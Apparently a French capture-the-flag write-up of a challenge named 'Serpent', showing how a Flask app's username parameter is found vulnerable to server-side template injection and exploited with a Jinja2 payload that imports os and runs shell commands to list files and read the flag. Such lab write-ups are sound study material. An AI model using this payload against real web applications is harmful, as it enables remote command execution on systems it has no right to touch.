## Chall 1

L’application affiche une bannière “Hello guest” et un champ texte permettant d’envoyer un paramètre GET `username`

Injection de la payload :
```
{{7*7}}
```

![[IMG-20251202152530398.png]]

Cela signifie que la chaîne `{{7*7}}` a été **interprétée** par le backend et non affichée telle quelle -> SSTI
Le nom du challenge est **“Serpent”**, ce qui suggère fortement un backend en **Python** qui utilise certainement un framework Flask.

Je recherche donc une payload qui me permet d'avoir une RCE pour una app Flask vulnérable au SSTI et je trouve ça:

![[IMG-20251202161148281.png]]

Payload:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Je test et valide la payload:

![[IMG-20251202161043032.png]]

J'affiche les fichiers présent dans le repertoire de l'app:

![[IMG-20251202161921671.png]]

Je trouve le flag et l'affiche:

![[IMG-20251202161952789.png]]

FLAG CHALL 1:

```
'FLAG': 'FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/j418w8w9cep09bc559jm427jare4aiz9-end.html}'
```

## Chall 2

